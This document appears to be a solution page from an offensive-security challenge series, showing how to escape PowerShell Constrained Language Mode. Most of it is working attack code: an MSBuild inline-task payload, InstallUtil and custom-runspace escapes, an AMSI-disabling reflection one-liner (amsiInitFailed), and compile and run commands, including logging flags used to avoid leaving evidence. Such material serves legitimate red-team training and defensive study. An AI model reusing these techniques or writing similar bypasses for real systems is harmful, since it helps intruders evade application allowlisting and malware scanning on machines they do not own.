---
title: "Solution 37: Constrained Language Mode (CLM) Escape"
challenge_number: 37
difficulty: hard
category: "AMSI Bypass"
permalink: /solutions/37-clm-escape/
---

# Solution: Constrained Language Mode (CLM) Escape

[Back to Challenge](../challenges/37-clm-escape.md)

## Overview

Constrained Language Mode restricts PowerShell to a safe subset: no .NET types, no COM, no `Add-Type`, no arbitrary method calls. However, CLM only applies to the current PowerShell session — alternative execution engines like MSBuild, InstallUtil, and custom .NET runspaces run in FullLanguage mode and are unaffected.

## Working Code

### Method 1: MSBuild Inline Task (Most Reliable)

**payload.csproj:**
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Reflection;

public class ClassExample : Task, ITask
{
    public override bool Execute()
    {
        // This runs in FullLanguage - full .NET access
        // Set amsiInitFailed in the calling PowerShell process
        Console.WriteLine("Executing in FullLanguage via MSBuild");
        Console.WriteLine("CLM Escaped - arbitrary .NET code running");

        // Example: run arbitrary code
        System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\temp\\output.txt");
        return true;
    }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

**Execute from PowerShell (works even in CLM):**
```powershell
# MSBuild is a trusted Microsoft binary - not subject to CLM
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

### Method 2: Custom Runspace (Escape from Within)

```powershell
# This works if you can execute C# via Add-Type in a parent context
# Or compile separately and load the assembly

# The C# code to create a FullLanguage runspace:
$code = @'
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class RunspaceBypass
{
    public static void Execute(string command)
    {
        // Create a new runspace - defaults to FullLanguage
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();

        // FullLanguage mode in the new runspace
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        ps.AddScript(command);

        var results = ps.Invoke();
        foreach (var result in results)
        {
            Console.WriteLine(result);
        }

        rs.Close();
    }
}
'@

# If you're in FullLanguage already (preparing the escape tool):
Add-Type -TypeDefinition $code -ReferencedAssemblies @(
    "System.Management.Automation"
)

# Execute any command in FullLanguage
[RunspaceBypass]::Execute('$ExecutionContext.SessionState.LanguageMode; [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)')
```

### Method 3: InstallUtil Bypass

**payload.cs:**
```csharp
using System;
using System.Configuration.Install;
using System.ComponentModel;

[RunInstaller(true)]
public class Payload : Installer
{
    // Uninstall method runs our code
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        base.Uninstall(savedState);

        // Arbitrary .NET code executes here
        Console.WriteLine("CLM escaped via InstallUtil");

        // Example: disable AMSI for a new PowerShell process
        var psi = new System.Diagnostics.ProcessStartInfo();
        psi.FileName = "powershell.exe";
        psi.Arguments = "-NoProfile -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); Write-Host 'AMSI disabled'\"";
        System.Diagnostics.Process.Start(psi);
    }
}
```

**Compile and execute:**
```cmd
:: Compile the DLL
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\csc.exe /target:library /out:payload.dll payload.cs

:: Execute via InstallUtil uninstall (the /U triggers Uninstall method)
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\InstallUtil.exe /LogFile= /LogToConsole=false /U payload.dll
```

**From CLM PowerShell:**
```powershell
# This command works in CLM because it just starts a process
Start-Process "C:\Windows\Microsoft.Net\Framework64\v4.0.30319\InstallUtil.exe" -ArgumentList "/LogFile= /LogToConsole=false /U C:\temp\payload.dll"
```

### Method 4: PowerShell Runspace via .exe

**escape.cs:**
```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program
{
    static void Main(string[] args)
    {
        // Create unrestricted runspace
        InitialSessionState iss = InitialSessionState.CreateDefault();
        iss.LanguageMode = PSLanguageMode.FullLanguage;

        using (Runspace rs = RunspaceFactory.CreateRunspace(iss))
        {
            rs.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = rs;
                ps.AddScript(args.Length > 0 ? args[0] : "Write-Host 'FullLanguage mode active'");
                var results = ps.Invoke();
                foreach (var r in results) Console.WriteLine(r);
            }
        }
    }
}
```

```cmd
:: Compile
csc.exe /reference:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\...\System.Management.Automation.dll escape.cs

:: Run - executes PowerShell code in FullLanguage
escape.exe "Write-Host $ExecutionContext.SessionState.LanguageMode"
```

## Why It Works

### CLM Scope is Limited

Constrained Language Mode is a property of the **current PowerShell session** (`$ExecutionContext.SessionState.LanguageMode`). It does NOT:
- Apply to child processes
- Affect MSBuild's CodeTaskFactory (which compiles and runs C# independently)
- Restrict InstallUtil's assembly loading
- Control runspaces created programmatically in .NET
- Affect any non-PowerShell execution engine

### The Trust Boundary Mismatch

```
┌─────────────────────────────────────┐
│  PowerShell Session (CLM)           │
│  - No Add-Type                      │
│  - No .NET access                   │
│  - No COM objects                   │
│  BUT can still:                     │
│  - Start-Process MSBuild.exe ✓      │
│  - Start-Process InstallUtil.exe ✓  │
│  - Start-Process custom.exe ✓       │
└────────────┬────────────────────────┘
             │ spawns
             ▼
┌─────────────────────────────────────┐
│  MSBuild / InstallUtil / custom.exe │
│  - Full .NET Framework access       │
│  - Arbitrary code execution         │
│  - Can create FullLanguage PS       │
│  - NOT subject to CLM               │
└─────────────────────────────────────┘
```

### MSBuild Specifically

MSBuild's `CodeTaskFactory` compiles C# code at runtime using the C# compiler (`csc.exe`). The resulting assembly runs in the MSBuild process with no language restrictions. Since MSBuild is a signed Microsoft binary in the .NET Framework directory, it's typically trusted by AppLocker and WDAC policies.

### InstallUtil Specifically

`InstallUtil.exe` loads any .NET assembly and calls its `Install()` or `Uninstall()` methods. The `/U` flag triggers `Uninstall()`, which we override with arbitrary code. The `/LogFile= /LogToConsole=false` flags suppress output to avoid leaving evidence.

## How to Verify

1. Confirm you're in Constrained Language Mode:
   ```powershell
   $ExecutionContext.SessionState.LanguageMode
   # Output: ConstrainedLanguage
   ```

2. Verify CLM restrictions are active:
   ```powershell
   # This should fail in CLM
   [System.Net.WebClient]::new()
   # Error: Cannot create type. Only core types are supported in this language mode.
   ```

3. Create the MSBuild payload file (payload.csproj from Method 1 above).

4. Execute MSBuild from the CLM session:
   ```powershell
   C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe C:\temp\payload.csproj
   ```

5. Verify it executed by checking the output or side effects:
   ```powershell
   Get-Content C:\temp\output.txt
   # Should contain whoami output, proving FullLanguage code ran
   ```

6. For the runspace approach, verify the new runspace is in FullLanguage:
   ```
   Output should show: FullLanguage
   ```
   This confirms the escape from CLM succeeded.
